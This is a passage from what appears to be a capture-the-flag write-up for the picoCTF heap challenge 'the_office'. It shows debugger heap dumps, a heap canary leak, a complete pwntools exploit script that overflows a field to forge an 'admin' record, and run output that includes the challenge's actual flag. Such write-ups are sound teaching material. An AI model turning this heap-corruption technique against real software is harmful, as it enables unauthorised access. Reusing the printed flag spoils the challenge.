<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤</span>  x/40x 0xf7ffb000
<span class=code-dark-blue>0xf7ffb000</span>:     0x73550262      0x00000035      0x00000001      0x41414141  
<span class=code-dark-blue>0xf7ffb010</span>:     0x00000000      0x00000000      0x00000000      0xf7ffb04c
<span class=code-dark-blue>0xf7ffb020</span>:     0x000000ff      0x42424242      0x00000000      0x00000000
<span class=code-dark-blue>0xf7ffb030</span>:     0x00000000      0x00000000      0x00000000      0x00000000
<span class=code-dark-blue>0xf7ffb040</span>:     0x73550262      0x00000025      0x00000035      0x61616161
<span class=code-dark-blue>0xf7ffb050</span>:     0x61616161      0x61616161      0x61616161      0x61616161
<span class=code-dark-blue>0xf7ffb060</span>:     0x61616161      0x00000000      0x00000000      0x00000000
<span class=code-dark-blue>0xf7ffb070</span>:     0x73550262      0x00000f84      0x00000025      0x00000000
<span class=code-dark-blue>0xf7ffb080</span>:     0x00000000      0x00000000      0x00000000      0x00000000
<span class=code-dark-blue>0xf7ffb090</span>:     0x00000000      0x00000000      0x00000000      0x00000000
</code></pre></div>
<p>Now the idea is to release the employee and add two new employees, without email:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤</span>  continue
Continuing.
2
Employee #?
0
0) Exit
1) Add employee
2) Remove employee
3) List employees
4) Get access token
1
Name: CCCC
Email (y/n)? n
Salary: 127
Phone #: DDDD
Bldg (y/n)? n

0) Exit
1) Add employee
2) Remove employee
3) List employees
4) Get access token
3
Employee 0:
Name: CCCC
Email:
Salary: 127
Bldg #: 0
Phone #: DDDD

0) Exit
1) Add employee
2) Remove employee
3) List employees
4) Get access token
1
Name: EEEE
Email (y/n)? n
Salary: 15
Phone #: FFFF
Bldg (y/n)? n

0) Exit
1) Add employee
2) Remove employee
3) List employees
4) Get access token
^C
Program received signal SIGINT, Interrupt.  
<span class=code-dark-blue>0xf7fcf549</span> in <span class=code-dark-yellow>__kernel_vsyscall</span> ()
</code></pre></div>
<p>Now, we have overwritten some of the previous values of the heap. As a result, the second user is replacing the <code>email</code> of the first employee:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤</span>  x/40x 0xf7ffb000
<span class=code-dark-blue>0xf7ffb000</span>:     0x73550262      0x00000035      0x00000001      0x43434343  
<span class=code-dark-blue>0xf7ffb010</span>:     0x00000000      0x00000000      0x00000000      0x00000000
<span class=code-dark-blue>0xf7ffb020</span>:     0x0000007f      0x44444444      0x00000000      0x00000000
<span class=code-dark-blue>0xf7ffb030</span>:     0x00000000      0x00000000      0x00000000      0x00000000
<span class=code-dark-blue>0xf7ffb040</span>:     0x73550262      0x00000035      0x00000035      0x45454545
<span class=code-dark-blue>0xf7ffb050</span>:     0x61616100      0x61616161      0x61616161      0x00000000
<span class=code-dark-blue>0xf7ffb060</span>:     0x0000000f      0x46464646      0x00000000      0x00000000
<span class=code-dark-blue>0xf7ffb070</span>:     0x73550262      0x00000f84      0x00000025      0x00000000
<span class=code-dark-blue>0xf7ffb080</span>:     0x73550262      0x00000f74      0x00000035      0x00000000
<span class=code-dark-blue>0xf7ffb090</span>:     0x00000000      0x00000000      0x00000000      0x00000000
</code></pre></div>
<p>And here we see that the second employee contains the canary value at the building (<code>Bldg</code>) position. So we can list all employees and leak the canary:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤</span>  continue
Continuing.
3
Employee 0:
Name: CCCC
Email:
Salary: 127
Bldg #: 0
Phone #: DDDD

Employee 1:
Name: EEEE
Email:
Salary: 15
Bldg #: 1934951010  
Phone #: FFFF
</code></pre></div>
<p>There we have it:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> -c <span class=code-dark-yellow>'print(hex(1934951010))'</span>  
0x73550262
</code></pre></div>
<p>What has happened is similar to a Use After Free vulnerability.</p>
<p>Now the exploitation is the same as before, but instead of computing the canary using a PRNG, we leak it. This is the Python exploit that solves the challenge in this way:</p>
<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk3>#!/usr/bin/env</span> <span class=mtk3>python3</span>

<span class=mtk5>from</span> <span class="mtk8 mtku">pwn</span> <span class=mtk5>import</span> <span class=mtk1>context</span><span class=mtk1>,</span> <span class=mtk1>log</span><span class=mtk1>,</span> <span class=mtk1>p32,</span> <span class="mtk8 mtku squiggly-inline-unnecessary">process</span><span class=mtk1>,</span> <span class="mtk8 mtku">remote</span><span class=mtk1>,</span> <span class="mtk8 mtku">sys</span>

<span class=mtk1>context</span><span class=mtk1>.</span><span class=mtk1>binary</span> <span class=mtk5>=</span> <span class=mtk4>'the_office'</span>
<span class=mtk1>elf</span> <span class=mtk5>=</span> <span class=mtk1>context</span><span class=mtk1>.</span><span class=mtk1>binary</span>


<span class="mtk7 mtki">def</span> <span class=mtk8>get_process</span><span class=mtk1>():</span>
    <span class=mtk5>if</span> <span class=mtk8>len</span><span class=mtk1>(</span><span class="mtk8 mtku">sys</span><span class=mtk1>.</span><span class=mtk1>argv</span><span class=mtk1>)</span> <span class=mtk5>==</span> <span class=mtk6>1</span><span class=mtk1>:</span>
        <span class=mtk5>return</span> <span class=mtk1>elf</span><span class=mtk1>.process()</span>

    <span class=mtk1>host</span><span class=mtk1>,</span> <span class=mtk1>port</span> <span class=mtk5>=</span> <span class="mtk8 mtku">sys</span><span class=mtk1>.</span><span class=mtk1>argv</span><span class=mtk1>[</span><span class=mtk6>1</span><span class=mtk1>],</span> <span class="mtk8 mtku">int</span><span class=mtk1>(</span><span class="mtk8 mtku">sys</span><span class=mtk1>.</span><span class=mtk1>argv</span><span class=mtk1>[</span><span class=mtk6>2</span><span class=mtk1>])</span>
    <span class=mtk5>return</span> <span class="mtk8 mtku">remote</span><span class=mtk1>(</span><span class=mtk1>host</span><span class=mtk1>,</span> <span class=mtk1>port</span><span class=mtk1>)</span>


<span class="mtk7 mtki">def</span> <span class=mtk8>add_employee</span><span class=mtk1>(</span><span class="mtk9 mtki">p</span><span class=mtk1>,</span> <span class="mtk9 mtki">name</span><span class=mtk5>=</span><span class="mtk7 mtki">b</span><span class=mtk4>'a'</span><span class=mtk1>,</span> <span class="mtk9 mtki">email</span><span class=mtk5>=</span><span class=mtk6>None</span><span class=mtk1>,</span> <span class="mtk9 mtki">salary</span><span class=mtk5>=</span><span class="mtk7 mtki">b</span><span class=mtk4>'1'</span><span class=mtk1>,</span> <span class="mtk9 mtki">phone</span><span class=mtk5>=</span><span class="mtk7 mtki">b</span><span class=mtk4>'b'</span><span class=mtk1>):</span>
    <span class="mtk9 mtki">p</span><span class=mtk1>.sendlineafter(</span><span class="mtk7 mtki">b</span><span class=mtk4>'token'</span><span class=mtk1>,</span> <span class="mtk7 mtki">b</span><span class=mtk4>'1'</span><span class=mtk1>)</span>
    <span class="mtk9 mtki">p</span><span class=mtk1>.sendlineafter(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Name:</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class="mtk9 mtki">name</span><span class=mtk1>)</span>

    <span class=mtk5>if</span> <span class="mtk9 mtki">email</span><span class=mtk1>:</span>
        <span class="mtk9 mtki">p</span><span class=mtk1>.sendlineafter(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Email</span> <span class=mtk4>(y/n)?</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class="mtk7 mtki">b</span><span class=mtk4>'y'</span><span class=mtk1>)</span>
        <span class="mtk9 mtki">p</span><span class=mtk1>.sendlineafter(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Email</span> <span class=mtk4>address:</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class="mtk9 mtki">email</span><span class=mtk1>)</span>
    <span class=mtk5>else</span><span class=mtk1>:</span>
        <span class="mtk9 mtki">p</span><span class=mtk1>.sendlineafter(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Email</span> <span class=mtk4>(y/n)?</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class="mtk7 mtki">b</span><span class=mtk4>'n'</span><span class=mtk1>)</span>

    <span class="mtk9 mtki">p</span><span class=mtk1>.sendlineafter(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Salary:</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class="mtk9 mtki">salary</span><span class=mtk1>)</span>
    <span class="mtk9 mtki">p</span><span class=mtk1>.sendlineafter(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Phone</span> <span class=mtk4>#:</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class="mtk9 mtki">phone</span><span class=mtk1>)</span>
    <span class="mtk9 mtki">p</span><span class=mtk1>.sendlineafter(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Bldg</span> <span class=mtk4>(y/n)?</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class="mtk7 mtki">b</span><span class=mtk4>'n'</span><span class=mtk1>)</span>


<span class="mtk7 mtki">def</span> <span class=mtk8>main</span><span class=mtk1>():</span>
    <span class=mtk1>p</span> <span class=mtk5>=</span> <span class=mtk8>get_process</span><span class=mtk1>()</span>

    <span class=mtk8>add_employee</span><span class=mtk1>(</span><span class=mtk1>p</span><span class=mtk1>,</span> <span class="mtk9 mtki">email</span><span class=mtk5>=</span><span class="mtk7 mtki">b</span><span class=mtk4>'A'</span> <span class=mtk5>*</span> <span class=mtk6>24</span><span class=mtk1>)</span>

    <span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'token'</span><span class=mtk1>,</span> <span class="mtk7 mtki">b</span><span class=mtk4>'2'</span><span class=mtk1>)</span>
    <span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Employee</span> <span class=mtk4>#?</span><span class=mtk6>\n</span><span class=mtk4>'</span><span class=mtk1>,</span> <span class="mtk7 mtki">b</span><span class=mtk4>'0'</span><span class=mtk1>)</span>

    <span class=mtk8>add_employee</span><span class=mtk1>(</span><span class=mtk1>p</span><span class=mtk1>)</span>
    <span class=mtk8>add_employee</span><span class=mtk1>(</span><span class=mtk1>p</span><span class=mtk1>)</span>

    <span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'token'</span><span class=mtk1>,</span> <span class="mtk7 mtki">b</span><span class=mtk4>'3'</span><span class=mtk1>)</span>
    <span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>recvuntil</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Bldg</span> <span class=mtk4>#:</span> <span class=mtk4>'</span><span class=mtk1>)</span>
    <span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>recvuntil</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Bldg</span> <span class=mtk4>#:</span> <span class=mtk4>'</span><span class=mtk1>)</span>

    <span class=mtk1>canary</span> <span class=mtk5>=</span> <span class="mtk8 mtku">int</span><span class=mtk1>(</span><span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>recvline</span><span class=mtk1>().</span><span class=mtk8>strip</span><span class=mtk1>().</span><span class=mtk8>decode</span><span class=mtk1>())</span>
    <span class=mtk1>log</span><span class=mtk1>.</span><span class=mtk8>info</span><span class=mtk1>(</span><span class="mtk7 mtki">f</span><span class=mtk4>'Leaked</span> <span class=mtk4>heap</span> <span class=mtk4>canary:</span> <span class=mtk6>{</span><span class=mtk8>hex</span><span class=mtk1>(</span><span class=mtk1>canary</span><span class=mtk1>)</span><span class=mtk6>}</span><span class=mtk4>'</span><span class=mtk1>)</span>

    <span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'token'</span><span class=mtk1>,</span> <span class="mtk7 mtki">b</span><span class=mtk4>'2'</span><span class=mtk1>)</span>
    <span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Employee</span> <span class=mtk4>#?</span><span class=mtk6>\n</span><span class=mtk4>'</span><span class=mtk1>,</span> <span class="mtk7 mtki">b</span><span class=mtk4>'0'</span><span class=mtk1>)</span>

    <span class=mtk8>add_employee</span><span class=mtk1>(</span><span class=mtk1>p</span><span class=mtk1>,</span> <span class="mtk9 mtki">phone</span><span class=mtk5>=</span><span class="mtk7 mtki">b</span><span class=mtk4>'A'</span> <span class=mtk5>*</span> <span class=mtk6>28</span> <span class=mtk5>+</span> <span class=mtk1>p32(</span><span class=mtk1>canary</span><span class=mtk1>)</span> <span class=mtk5>+</span> <span class=mtk1>p32(</span><span class="mtk7 mtki">0x</span><span class=mtk6>35</span><span class=mtk1>)</span> <span class=mtk5>*</span> <span class=mtk6>2</span> <span class=mtk5>+</span> <span class="mtk7 mtki">b</span><span class=mtk4>'admin'</span><span class=mtk1>)</span>  

    <span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'token'</span><span class=mtk1>,</span> <span class="mtk7 mtki">b</span><span class=mtk4>'4'</span><span class=mtk1>)</span>
    <span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Employee</span> <span class=mtk4>#?</span><span class=mtk6>\n</span><span class=mtk4>'</span><span class=mtk1>,</span> <span class="mtk7 mtki">b</span><span class=mtk4>'1'</span><span class=mtk1>)</span>

    <span class=mtk1>log</span><span class=mtk1>.</span><span class=mtk8>success</span><span class=mtk1>(</span><span class="mtk7 mtki">f</span><span class=mtk4>'Flag:</span> <span class=mtk6>{</span><span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>recvline</span><span class=mtk1>().</span><span class=mtk8>decode</span><span class=mtk1>()</span><span class=mtk6>}</span><span class=mtk4>'</span><span class=mtk1>)</span>
    <span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>close</span><span class=mtk1>()</span>


<span class=mtk5>if</span> <span class=mtk1>__name__</span> <span class=mtk5>==</span> <span class=mtk4>'__main__'</span><span class=mtk1>:</span>
    <span class=mtk8>main</span><span class=mtk1>()</span>
</code></pre></div>
<p>It works both locally and remotely:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>echo</span> THISISTHEFLAG > flag.txt

<span class=code-cyan>$</span> <span class=code-dark-green>python3</span> solve2.py
[<span class=code-blue>*</span>] './the_office'
    Arch:     i386-32-little
    RELRO:    <span class=code-dark-yellow>Partial RELRO</span>
    Stack:    <span class=code-dark-green>Canary found</span>
    NX:       <span class=code-dark-green>NX enabled</span>
    PIE:      <span class=code-dark-red>No PIE (0x8048000)</span>
[<span class=code-green>+</span>] Starting local process './the_office': pid 2081382
[<span class=code-blue>*</span>] Leaked heap canary: 0x5c3b7895
[<span class=code-blue>*</span>] Process './the_office' stopped with exit code 0 (pid 2081382)  
[<span class=code-green>+</span>] Flag: THISISTHEFLAG
</code></pre></div>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> solve2.py mercury.picoctf.net 24751
[<span class=code-blue>*</span>] './the_office'
    Arch:     i386-32-little
    RELRO:    <span class=code-dark-yellow>Partial RELRO</span>
    Stack:    <span class=code-dark-green>Canary found</span>
    NX:       <span class=code-dark-green>NX enabled</span>
    PIE:      <span class=code-dark-red>No PIE (0x8048000)</span>
[<span class=code-green>+</span>] Opening connection to mercury.picoctf.net on port 24751: Done  
[<span class=code-blue>*</span>] Leaked heap canary: 0x29df8536
[<span class=code-green>+</span>] Flag: picoCTF{cb3b0507a278ae12d2465d4c8ee30f31}
[<span class=code-blue>*</span>] Closed connection to mercury.picoctf.net port 24751
</code></pre></div>
<div class="mt6 instapaper_ignoref">
</div>
</div>
</article>
</main>
<footer class="bg-black bottom-0 w-100 pa3" role=contentinfo>
<div class="flex justify-between">
<a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href=https://7rocky.github.io/ title=https://7rocky.github.io/>&copy; 7Rocky 2022</a>
<div style=margin-top:8px>
<div>
<div>
<a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
<a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="Github link" rel=noopener aria-label="follow on Github——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
</div>
</div>
</div>
</div>
</footer>
</body>
</html>